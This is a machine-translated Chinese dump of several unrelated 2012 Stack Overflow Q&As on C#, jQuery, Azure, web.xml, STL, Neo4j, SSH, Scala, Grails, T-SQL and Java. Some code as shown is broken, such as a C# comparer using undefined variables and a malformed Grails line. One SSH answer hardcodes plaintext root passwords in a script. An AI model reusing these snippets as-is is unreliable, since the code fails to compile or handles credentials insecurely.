您可以创建自己的比较器并将其传递给 OrderBy 或 ThenBy，让它们以您想要的方式对字符串进行排序[。](http://msdn.microsoft.com/en-us/library/cfttsh47)

例如，这个非常原始的比较器会在转换字符串之前用 0 填充最后一个数字：

```
class MyComparer:Comparer<string>
{
    public override int Compare(string x, string y)
    {
        var xL = xparts[xparts.Length - 1];
        long xN;
        if (long.TryParse(xL,out xN))
        {
            xparts[xparts.Length - 1] = xN.ToString().PadLeft(20,'0');
        }

        var yL = yparts[yparts.Length - 1];
        long yN;
        if (long.TryParse(yL, out yN))
        {
            yparts[yparts.Length - 1] = yN.ToString().PadLeft(20, '0');
        }

        var x2=String.Join(" ", xparts);
        var y2 = String.Join(" ", yparts);

        return x2.CompareTo(y2);
    }
} 
```

您可以通过最小的更改来调用它：

```
var query = _cityRepository.GetAll(
           .OrderBy(item => item.RowKey.Substring(0, 4))
           .ThenBy(item => item.ShortTitle, new MyComparer()); 
```

# javascript - 如何比较属性值

> ID：11052101
> 
> 赞同：0
> 
> 时间：2012-06-15T13:59:51.453
> 
> 标签：javascript, jquery

是否可以比较jQuery中的属性值？

例子

```
if( $(this).[ attribute value ] == "0")
{}
else
{} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-15T14:00:42.723

您可以使用[`attr`](http://api.jquery.com/attr/)方法获取属性值：

```
if ($(this).attr("myAttr") == "0") {
    // "myAttr" value is "0"
} else {
    // "myAttr" value is not "0"
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:00:44.177

```
if($(this).attr("yourAttribute") == "0"){
    //do something
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-15T14:01:23.403

试试这个

```
if( $(this).attr('myattribute') == "0")    
{
   //Your statements
}    
else    
{
   //Your statements
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-15T14:06:27.443

您可以使用该方法获取属性值`attr`并进行比较：

```
if ($(this).attr("attrname") == "0") {
  $(this).css('background', 'red');
} 
```

您还可以使用选择器过滤掉具有特定属性值的元素：

```
$(this).filter('[attrname=0]').css('background', 'red'); 
```

# azure - Windows azure：为订阅设置过滤器时出现异常

> ID：11052102
> 
> 赞同：1
> 
> 时间：2012-06-15T13:59:51.907
> 
> 标签：azure, azureservicebus

我尝试创建订阅并为该订阅设置过滤器，但 createRule 方法引发异常。关于如何解决它的任何想法？谢谢。

```
SubscriptionInfo subInfo1 = new SubscriptionInfo("High_Ages"); 
CreateSubscriptionResult result1 = serviceBusContract.createSubscription(topicName, subInfo1); 
ruleInfo1 = ruleInfo1.withSqlExpressionFilter("user_age >= 50"); 
CreateRuleResult ruleResult = serviceBusContract.createRule(topicName, "High_Ages", ruleInfo1); 
```

方法 createRule(topicName,"High_Ages", ruleInfo1) 引发以下异常

`java.lang.IllegalArgumentException: Path segment is null com.sun.jersey.api.uri.UriBuilderImpl.appendPath(UriBuilderImpl.java:499) com.sun.jersey.api.uri.UriBuilderImpl.appendPath(UriBuilderImpl.java:494) com.sun.jersey.api.uri.UriBuilderImpl.path(UriBuilderImpl.java:254) com.sun.jersey.api.client.WebResource.path(WebResource.java:390) com.microsoft.windowsazure.services.serviceBus.implementation.ServiceBusRestProxy.createRule(ServiceBusRestProxy.java:361) com.microsoft.windowsazure.services.serviceBus.implementation.ServiceBusExceptionProcessor.createRule(ServiceBusExceptionProcessor.java:346)`

# java - 在servlet的web.xml中保留单词？

> ID：11052108
> 
> 赞同：1
> 
> 时间：2012-06-15T14:00:14.340
> 
> 标签：java, tomcat, servlets, netbeans, web.xml

我对 servlet 还很陌生，所以我希望这不是一个明显的问题。因此，我有一个使用模板在 NetBeans 中创建的简单 Java servlet。我在 web.xml 中创建了一个上下文参数，其中列出了允许的主机（我的请求参数之一是一个 URL，我将与此列表进行比较）：

```
<context-param>
    <param-name>allowedHosts</param-name>
    <param-value>
        http://opendap.co-ops.nos.noaa.gov/thredds/wms/NOAA/CBOFS/MODELS/201206/nos.cbofs.fields.nowcast.20120612.t00z.nc?service=WMS&version=1.3.0&request=GetCapabilities
        http://www.google.com
        http://www.facebook.com
    </param-value>
</context-param> 
```

当我只将虚拟 URL 放入 Google 和 Facebook 时，这非常有效。但是，当我添加第一个 URL 时，Tomcat 服务器甚至无法部署。查看我的日志，我在一个很长的堆栈跟踪的顶部看到了这一点：

```
SEVERE: Parse Fatal Error at line 19 column 146: The reference to entity "version" must end with the ';' delimiter.
org.xml.sax.SAXParseException: The reference to entity "version" must end with the ';' delimiter. 
```

第 19 行第 146 列确实指向我在上下文参数列表中拥有的那个长 URL 的“版本”部分。所以显然“版本”是某种保留词。如果我从这个 URL 中删除“版本”参数，“请求”也是一个问题。

我可以通过`http://opendap.co-ops.nos.noaa.gov/thredds/wms/`像 URL 一样来解决这个问题（因为最终我想要一个主机列表而不是特定的 URL），但我想知道要不然怎么做才能解决这个问题......有没有办法包括在 web.xml 中有这样的“保留词”的 URL？

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-15T14:03:34.983

只需输入“&” （不带引号）而不是 URL 中的 & 符号。

希望这会有所帮助 - DF

编辑：试试这个：

```
<context-param>
<param-name>allowedHosts</param-name>
<param-value>
    http://opendap.co-ops.nos.noaa.gov/thredds/wms/NOAA/CBOFS/MODELS/201206/nos.cbofs.fields.nowcast.20120612.t00z.nc?service=WMS&amp;version=1.3.0&amp;request=GetCapabilities
</param-value> 
```

Edit2：PS 这些东西在 XML 中被称为“实体”——谷歌了解更多信息

# c++ - c++：STL 对迭代器使用通用的“end()”值？

> ID：11052109
> 
> 赞同：3
> 
> 时间：2012-06-15T14:00:16.057
> 
> 标签：c++, stl, iterator

给定 STL 容器的所有实例的“.end()”迭代器是否指向同一个“过去的”对象？

例如

```
std::set<int> my_set_1;
// fill  "my_set_1"
std::set<int> my_set_2;
// fill  "my_set_2"

bool same_end_iterator  =       my_set_1.end() == my_set_2.end()    ; 
```

最后一行是否依赖于实现？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-06-15T14:02:20.003

> 给定 STL 容器的所有实例的“.end()”迭代器是否指向同一个“过去的”对象？

不，该标准不能保证这一点，实际上某些容器类型可能不会那样工作。例如`std::vector::iterator`，通常实现为指向数组元素的指针，并`end()`指向数组的末尾。

> 最后一行是否依赖于实现？

最后一行给出了未定义的行为。您无法比较来自不同集合的迭代器——包括过去的迭代器。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-15T14:01:45.030

*从概念上讲，每个容器*都有一个终端迭代器，并且将迭代器与不同容器（即使是相同类型的容器）进行比较是 UB。

实际上，对于老式数组，off-the-end 迭代器是数组的基数，是`a+N`其中元素的数量，这意味着不同的数组有不同的 off-the-end 迭代器。这也是我能想到的最明智的实现。`a``N``std::vector::iterator`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-15T14:04:23.530

据我所知，属于不同容器的迭代器的比较是未定义的，我不记得是哪个。这反而暗示了给定的`std::vector<int> foo, bar`,`foo.end()`不等于`bar.end()`。

# neo4j - Neo4j 获取相关组

> ID：11052110
> 
> 赞同：1
> 
> 时间：2012-06-15T14:00:18.723
> 
> 标签：neo4j

我不确定这个标题的措辞是否很好，但不知道该怎么做。我正在用一些数据填充 Neo4j 数据库。

数据主要是从我拥有的关于成对用户的数据中生成的。用户之间存在百分比关系，例如：

```
 80
A ---> B 
```

但反向关系不一样：

```
 60
A <--- B 
```

我可以把这两种关系都放进去，但我想我可以做的是使用平均值：

```
 70
A <--> B 
```

但我愿意接受这里的建议。

我想在 Neo4j 中做的是获取相关用户组。例如，我想获得一组平均百分比 > 50 的用户。所以，如果我们有：

```
 A
40  /   \  60
   B --- C ------ D
     20      70 
```

我们会得到一个子集，比如：

```
 A
        \  60
         C ------ D
             70 
```

我不知道该怎么做。另一件事是我很确定不可能从任何其他节点到达任何节点，我认为它是脱节的。比如，几个大图。但我希望能够获得上述所有内容，即使某些节点组与其他节点完全分开。

作为数字的概念，将有大约 100,000 个节点和 550,000 条边

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T17:27:35.370

几个想法。

首先，如果您的图表没有连接，那很好，但是您需要*某种*方式来访问您想要分析的每个组件。在 Neo4j 中的断开连接的图中，这要么意味着 Lucene 索引、一些包含节点或关系 ID 的外部“索引”，要么迭代数据库中的所有节点或关系（这很慢，但可能是您的问题所需要的）。

其次，虽然我不知道您的领域，但请意识到坚持原始表示和权重可能没问题。Neo 没有无向边（尽管您可以忽略边方向），您以后可能需要这些数据。OTOH，您采用权重平均值的修改确实简化了您的分析。

第三 - 根据图表的大小和特征，这可能会非常慢。听起来您希望子图中的*所有*连接组件都从权重大于 50 的边构建。AFAIK，这需要对数据库进行 O(N) 操作，其中 N 是数据库中的边数。您可以遍历数据库中的所有边，根据它们的权重进行过滤，然后从那里进行聚类。

使用 Gremlin/Groovy，你可以很容易地做到这一点。查看[Gremlin 文档](https://github.com/tinkerpop/gremlin/wiki)。

另一种方法可能是在插入数据时进行某种迭代聚类。在我看来，这可能是一个显着的实际性能改进，尽管它没有绕过 O(N) 的必要性。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-16T14:18:45.190

也许像[http://tinyurl.com/c8tbth4](http://tinyurl.com/c8tbth4)这样的东西在这里适用？

```
start a=node(*) match p=a-[r]-()-[t]-() where r.percent>50 AND t.percent>50 return p, r.percent, t.percent 
```

# linux - Linux 脚本 - 密码步骤切断流程

> ID：11052114
> 
> 赞同：0
> 
> 时间：2012-06-15T14:00:31.207
> 
> 标签：linux, login, ssh, command

让我们假设我想将 ssh 写入 1.2.3.4 的脚本，然后调用 ls。问题是当调用“ssh 1.2.3.4”行时，需要密码，因此，即使我填写了密码，流程也会停止，脚本不会继续。输入密码后如何让脚本继续运行？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T18:10:22.713

你想做公钥认证。这里有一些资源可以帮助你前进。

[http://magicmonster.com/kb/net/ssh/auto_login.html](http://magicmonster.com/kb/net/ssh/auto_login.html)

[http://www.cs.rpi.edu/research/groups/vision/doc/auto/ssh/ssh_public_key_authentication.html](http://www.cs.rpi.edu/research/groups/vision/doc/auto/ssh/ssh_public_key_authentication.html)

我会发布更多链接，但我没有足够的声誉点。;) 如果您需要更多帮助，只需在“SSH 自动登录”或“SSH 公钥身份验证”上搜索。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T14:04:40.803

实际上，您正在尝试在本地运行 ls 但您打开了一个 ssh 会话。所以在会话打开之前它不会运行 ls 。如果你想远程运行 ls，你应该使用

`ssh username@host COMMAND`

其中 command 是您要运行的命令。调用命令后，SSH 会话将立即结束，您可以正常捕获其输出。

我建议您对需要 ssh 的脚本使用 RSA 身份验证方法。

我刚试过这个脚本：

```
#!/bin/sh
ssh vps1 ls
mkdir temp
cd temp
echo test > file.txt 
```

它有效。我可以连接到我的服务器并列出我的家。然后，它在本地创建临时目录，将 cd 放入其中，然后在其中创建带有“测试”的 file.txt。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-01-20T18:52:25.133

编写名为 login_to 的简单登录 bash 脚本并授予 exec 权限（chmod 744 login_to）

```
#!/bin/bash

if [ $1 = 'srv1' ]; then
  echo 'srv1-pass' | pbcopy
  ssh root@11.11.11.11
fi

if [ $1 = 'foo' ]; then
  echo 'barbaz' | pbcopy
  ssh -t dux@22.22.22.22 'cd ~/somedir/someotherdir; bash'
fi 
```

现在像这样使用它

login_to srv1

login_to foo

当要求输入密码时，只需点击（ctrl+v 或 command+v）即可登录。

# scala - Scala中的“泛型”？

> ID：11052117
> 
> 赞同：3
> 
> 时间：2012-06-15T14:00:38.030
> 
> 标签：scala, generics

在Java中我会写

```
void foo(final Set<? extends SomeClass> someObjects) { /* ... */ } 
```

我在 Scala 中写什么？

```
def foo(someObjects : Set[AnyRef[SomeClass]) 
```

但这不起作用

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-15T14:35:44.590

我发现自己很少再写这样的代码了。原因是，在你的例子中

```
void foo(final Set<? extends SomeClass> someObjects) { /* ... */ }
//                ^^^^^^^^^^
//                use-site variance annotation 
```

*方差注释*表示您只能访问集合，不能更新它。您很可能可以按如下方式重写该方法

```
void foo(final Collection<? extends SomeClass> someObjects) { /* ... */ } 
```

也就是说，如果您只能访问集合中的元素，那么您不太可能*需要*它是`Set`. 在 scala 中，这意味着使用`Iterable`或`Traversable`- 但*Scala 中的这些类型在*它们的类型参数中是**协变**的（它们被声明`Iterable[+A]`-`+`是一个*声明站点方差注释*）。因此不需要使用站点差异注释：

```
def foo(itr: Iterable[SomeClass]) 
```

然后你可以`Set[SomeClassImpl]`自由地传入这个方法：

```
scala> trait T; class S extends T
defined trait T
defined class S

scala> def foo(itr: Iterable[T]) = println(itr.isEmpty)
foo: (itr: Iterable[T])Unit

scala> Set(new S)
res1: scala.collection.immutable.Set[S] = Set(S@e1ed5b)

scala> foo(res1)
false 
```

scala`Set[A]`不是协变的原因`A`是它实现了`A => Boolean`（即*Function1*），它的输入是*逆变*的。因此`Set[A]`在 中必须是不变的`A`。以前有个笨蛋[问过这个问题](https://stackoverflow.com/questions/676615/why-is-scalas-immutable-set-not-covariant-in-its-type)。

事实上，我现在将它`Set`用作谓词函数的*实现细节更为常见。*因此，例如：

```
def bar(p: SomeClass => Boolean) 
```

在这种情况下；你可以使用：

```
scala> bar(res1.toSet[T]) 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-06-15T18:50:24.750

直译为

```
void foo(final Set<? extends SomeClass> someObjects) { /* ... */ } 
```

是

```
def foo(someObjects: Set[_ <: SomeClass]) { /* ... */ } 
```

或者

```
def foo(someObjects: Set[_ <: SomeClass]): Unit = { /* ... */ } 
```

如果您要覆盖 Java 类中的某些方法，`override`请在`def`. 如果你不是，请考虑以不同的方式做事，正如其他答案所解释的那样。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-06-15T14:21:12.593

您可以使用类型绑定来定义依赖项：

```
def foo[A <: SomeClass]( someObjects: Set[A] ): Unit = ... 
```

这里`A <: SomeClass`的意思是`A`extends `SomeClass`，你可以用`B >: SomeClass`比`B`应该的超类来表达`SomeClass`。

# grails - Grails request.getFile 在 Jetty 中工作，但在部署到 Glassfish 3.1.2 服务器时返回 Null

> ID：11052123
> 
> 赞同：0
> 
> 时间：2012-06-15T14:00:45.767
> 
> 标签：grails, groovy, glassfish, jetty

我使用 Grails 2.0.4 构建了我的应用程序并在 Jetty 中对其进行了测试。在 Jetty 中一切正常，但是当我部署到 Glassfish 时，当我尝试在我的操作中分配一个文件时，我得到了一个 npe。为什么在 glassfish 上上传的文件为空，但使用码头可以？

```
def  uploadedFile = request.getFile('name_of_file') 
```

Firebug 显示 http 请求正在获取文件。这是来自 Firebug 的多部分表单数据 Post 请求的开头：

```
**name_of_file**    %PDF-1.4 %âãÏÓ 5 0 obj <</Length 2712/Filter/FlateDecode>>stream x[]oÜ6}_A /ÛÝZD}öM+¶ñÌT#'5¶ÂuÄeolÅþüÔ¥D^êòÑ(PÏuyÎ¹<¤4²úuuÚ¬|æ!k>®ÊfõëêëÊ÷|ÆìïUÈ~ÿñ 
```

因此，看起来文件信息在部署时在客户端被参数化，但没有进入控制器。

**我的控制器代码：**

```
 def sample(){

    if (params.ID == null) return 

    def sampleInstance = new Sample(params)// new sample
    if (sampleInstance.validate()) { // try to validate
        def  uploadedFile = request.getFile('name_of_file')// see if there is a file to upload
        session.uploadedFile = [
            originalFile: uploadedFile.originalFilename
        ]

        if (uploadedFile != null) { // is there a file? 
            sampleInstance.filepath =${uploadedFile.originalFilename}" // save the original filename

        }
        if (params.ageUnk){
           sampleInstance.sampleAge = null;
        }
        if (!params.ageUnk){
        def patients_age_in_years = (Integer.parseInt(params.patientYrs) * 12)

        def patients_age_in_months = Integer.parseInt(params.patientMos)

        def patients_total_age_in_months = (patients_age_in_years + patients_age_in_months) 

        sampleInstance.sampleAge = patients_total_age_in_months
        }

        sampleInstance.enteredby = springSecurityService.currentUser.id 
        sampleInstance.save()// save the sample in the database

        redirect( action:'sample', model:[sampleInstance:sampleInstance, checkDate:today, date: now])

    }else{
         [sampleInstance:sampleInstance, checkDate:today, date: now]
    }

} 
```

除文件外，所有参数都可以通过。**这是我的 gsp 表格：**

```
<g:uploadForm action="sample">
<table>
  <tr>
    <td align="right"><br><b> Comments: &nbsp</b></td>
    <td><br><g:textField name="nameComments" value="" style='width: 200px'/></td>
  </tr>
    <td align="right"><br><b>ID: &nbsp</b></td>
    <td><br><g:textField name="nameID" value="" /></td>
  </tr>
  <tr>
    <td align="right"><br><b>Upload File: &nbsp</b></td>
    <td><br><input type='file' name='name_of_file' /></td>
  </tr>
  <tr>
    <td align="right"></td>
    <td><g:submitButton name="submit" value="Submit" /></td>
  </tr>
</table> 

</g:uploadForm> 
```

堆栈跟踪：

```
java.lang.NullPointerException: Cannot get property 'originalFilename' on null object 
at org.codehaus.groovy.runtime.NullObject.getProperty(NullObject.java:56) 
at org.codehaus.groovy.runtime.InvokerHelper.getProperty(InvokerHelper.java:156) 
at org.codehaus.groovy.runtime.callsite.NullCallSite.getProperty(NullCallSite.java:44) 
at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callGetProperty(AbstractCallSite.java:227) 
at lims.SubmitSampleController.sample(SubmitSampleController.groovy:27) 
at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) 
at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) 
at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) 
at java.lang.reflect.Method.invoke(Method.java:601) 
at org.codehaus.groovy.grails.web.servlet.mvc.MixedGrailsControllerHelper.invoke(MixedGrailsControllerHelper.java:67) 
at org.codehaus.groovy.grails.web.servlet.mvc.AbstractGrailsControllerHelper.handleAction(AbstractGrailsControllerHelper.java:330) 
at org.codehaus.groovy.grails.web.servlet.mvc.AbstractGrailsControllerHelper.executeAction(AbstractGrailsControllerHelper.java:211) 
at org.codehaus.groovy.grails.web.servlet.mvc.AbstractGrailsControllerHelper.handleURI(AbstractGrailsControllerHelper.java:177) 
at org.codehaus.groovy.grails.web.servlet.mvc.AbstractGrailsControllerHelper.handleURI(AbstractGrailsControllerHelper.java:116) 
at org.codehaus.groovy.grails.web.servlet.mvc.SimpleGrailsController.handleRequest(SimpleGrailsController.java:72) 
at org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter.handle(SimpleControllerHandlerAdapter.java:48) 
at org.codehaus.groovy.grails.web.servlet.GrailsDispatcherServlet.doDispatch(GrailsDispatcherServlet.java:325) 
at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:827) 
at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:882) 
at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:789) 
at javax.servlet.http.HttpServlet.service(HttpServlet.java:688) 
at javax.servlet.http.HttpServlet.service(HttpServlet.java:770) 
at org.apache.catalina.core.StandardWrapper.service(StandardWrapper.java:1542) 
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:343) 
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:217) 
at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:70) 
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:256) 
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:217) 
at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:70) 
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:256) 
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:217) 
at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:70) 
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:256) 
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:217) 
at org.apache.catalina.core.ApplicationDispatcher.doInvoke(ApplicationDispatcher.java:807) 
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:671) 
at org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:505) 
at org.apache.catalina.core.ApplicationDispatcher.doDispatch(ApplicationDispatcher.java:476) 
at org.apache.catalina.core.ApplicationDispatcher.dispatch(ApplicationDispatcher.java:355) 
at org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:305) 
at org.codehaus.groovy.grails.web.util.WebUtils.forwardRequestForUrlMappingInfo(WebUtils.java:312) 
at org.codehaus.groovy.grails.web.util.WebUtils.forwardRequestForUrlMappingInfo(WebUtils.java:277) 
at org.codehaus.groovy.grails.web.util.WebUtils.forwardRequestForUrlMappingInfo(WebUtils.java:268) 
at org.codehaus.groovy.grails.web.mapping.filter.UrlMappingsFilter.doFilterInternal(UrlMappingsFilter.java:209) 
at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76) 
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:256) 
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:217) 
at org.codehaus.groovy.grails.web.sitemesh.GrailsPageFilter.obtainContent(GrailsPageFilter.java:200) 
at org.codehaus.groovy.grails.web.sitemesh.GrailsPageFilter.doFilter(GrailsPageFilter.java:151) 
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:256) 
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:217) 
at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:369) 
at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:109) 
at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:83) 
at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:381) 
at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:97) 
at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:381) 
at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:78) 
at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:381) 
at org.springframework.security.web.authentication.rememberme.RememberMeAuthenticationFilter.doFilter(RememberMeAuthenticationFilter.java:119) 
at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:381) 
at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:54) 
at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:381) 
at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:187) 
at org.codehaus.groovy.grails.plugins.springsecurity.RequestHolderAuthenticationFilter.doFilter(RequestHolderAuthenticationFilter.java:40) 
at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:381) 
at org.codehaus.groovy.grails.plugins.springsecurity.MutableLogoutFilter.doFilter(MutableLogoutFilter.java:79) 
at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:381) 
at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:79) 
at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:381) 
at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:168) 
at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:346) 
at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:259) 
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:256) 
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:217) 
at org.codehaus.groovy.grails.web.servlet.mvc.GrailsWebRequestFilter.doFilterInternal(GrailsWebRequestFilter.java:69) 
at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76) 
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:256) 
at org.apache.catalina. 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T16:40:32.770

显然这是 Glassfish 3.1.2 的问题。今天早上我发现了一条关于我的问题的[推文，这使我找到了这个](http://twitter.com/glen_a_smith/statuses/213539806519623682)[JIRA](http://java.net/jira/browse/GLASSFISH-18444)

替换 web-core.jar 文件为我解决了这个问题。为了概念验证，我下载了 Glassfish 3.1.1 并在该版本上运行我的应用程序，没有任何问题。因此，所有事情都指向 3.1.2 是我问题的根本原因。我的应用程序中没有任何内容。

# tsql - 从 URL 中获取文件名

> ID：11052124
> 
> 赞同：1
> 
> 时间：2012-06-15T14:00:50.690
> 
> 标签：tsql

我正在尝试在此处获取 .aspx 文件名的子字符串，但不太确定如何去做。

所以我不想要文件路径，只想要文件名：

例如[http://somesite.com/directory1/directory2/SomePage.aspx](http://somesite.com/directory1/directory2/SomePage.aspx)

我只需要 SomePage.aspx

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:04:31.863

你可以;

```
;with EG(fn) as (
    select 'http://somesite.com/directory1/directory2/SomePage.aspx' union
    select '' union
    select '/xxx.php'
)
select 
    right(fn, charindex('/', reverse(fn) + '/') - 1) 
from EG

-------------

xxx.php
SomePage.aspx 
```

（第一次出现 / 在反向 url 中；添加 / 来处理空/无斜杠字符串）

# java - 将逗号分隔值转换为列表

> ID：11052125
> 
> 赞同：23
> 
> 时间：2012-06-15T14:00:53.117
> 
> 标签：java

假设我有一组数字，例如`1,2,3,4,5,6,7`input 作为单个`String`. 我想将这些数字转换为一个`List`对象，`Long`即`List<Long>`.

谁能推荐最简单的方法？

* * *

## 回答 #1

> 赞同：63
> 
> 时间：2012-06-15T14:03:36.680

你的意思是这样的？

```
String numbers = "1,2,3,4,5,6,7";

List<Long> list = new ArrayList<Long>();
for (String s : numbers.split(","))
    list.add(Long.parseLong(s));

System.out.println(list); 
```

从 Java 8 开始，您可以将其重写为

```
List<Long> list = Stream.of(numbers.split(","))
        .map(Long::parseLong)
        .collect(Collectors.toList()); 
```

* * *

如果你想得到更短的版本`List<String>`

```
List<String> fixedSizeList = Arrays.asList(numbers.split(","));
List<String> resizableList = new ArrayList<>(fixedSizeList); 
```

或单线

```
List<String> list = new ArrayList<>(Arrays.asList(numbers.split(","))); 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2014-12-16T11:15:25.633

[使用java-8](/questions/tagged/java-8 "显示标记为“java-8”的问题")的简单方便的解决方案（为了完成线程）：

```
String str = "1,2,3,4,5,6,7";
List<Long> list = Arrays.stream(str.split(",")).map(Long::parseLong).collect(Collectors.toList()); 
```

> ```
> System.out.println(list); 
> ```
> 
> [1、2、3、4、5、6、7]

更好的是，使用`Pattern.splitAsStream()`：

```
Pattern.compile(",").splitAsStream(str).map(Long::parseLong).collect(Collectors‌​.toList()); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-06-15T14:11:19.733

```
String input = "1,2,3,4,5,6,7";
String[] numbers = input.split("\\,");
List<Integer> result = new ArrayList<Integer>();
for(String number : numbers) {
    try {
        result.add(Integer.parseInt(number.trim()));
    } catch(Exception e) {
        // log about conversion error
    }
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-10-28T00:02:33.670

您可以使用`String.split()`和`Long.valueOf()`：

```
String numbers = "1,2,3,4,5,6,7";
List<Long> list = new ArrayList<Long>();
for (String s : numbers.split(","))
    list.add(Long.valueOf(s));

System.out.println(list); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2016-04-28T07:25:03.527

如果您不在 java8 上并且不想使用循环，那么您可以使用[Guava](https://code.google.com/p/guava-libraries/)

```
List<Long> longValues = Lists.transform(Arrays.asList(numbersArray.split(",")), new Function<String, Long>() {
                @Override
                public Long apply(String input) {
                    return Long.parseLong(input.trim());
                }
            }); 
```

正如其他人提到的 Java8 一样，您可以使用 Streams。

```
List<Long> numbers = Arrays.asList(numbersArray.split(","))
                      .stream()
                      .map(String::trim)
                      .map(Long::parseLong)
                      .collect(Collectors.toList()); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-07-06T10:11:16.783

我最近使用了以下内容：

```
import static com.google.common.collect.ImmutableList.toImmutableList;
import com.google.common.base.Splitter;
import com.google.common.collect.ImmutableList;
...

    final ImmutableList<Long> result = Splitter.on(",")
        .trimResults()
        .omitEmptyStrings()
        .splitToStream(value)
        .map(Long::valueOf)
        .collect(toImmutableList()); 
```

这使用了来自 Guava 的 Splitter（处理空字符串和空格）并且不使用[令人惊讶的 String.split()](https://errorprone.info/bugpattern/StringSplitter)。

* * *

## 回答 #7

> 赞同：-14
> 
> 时间：2012-06-15T14:09:13.017

我会使用优秀的 google 的 Guava 库来做到这一点。String.split 会引起很多麻烦。

```
String numbers="1,2,3,4,5,6,7";
Iterable<String> splitIterator = Splitter.on(',').split(numbers);
List<String> list= Lists.newArrayList(splitIterator ); 
```

# jquery - Jquery Banner - 带有淡入淡出和弹出框

> ID：11052128
> 
> 赞同：0
> 
> 时间：2012-06-15T14:01:07.513
> 
> 标签：jquery, jquery-animate, banner

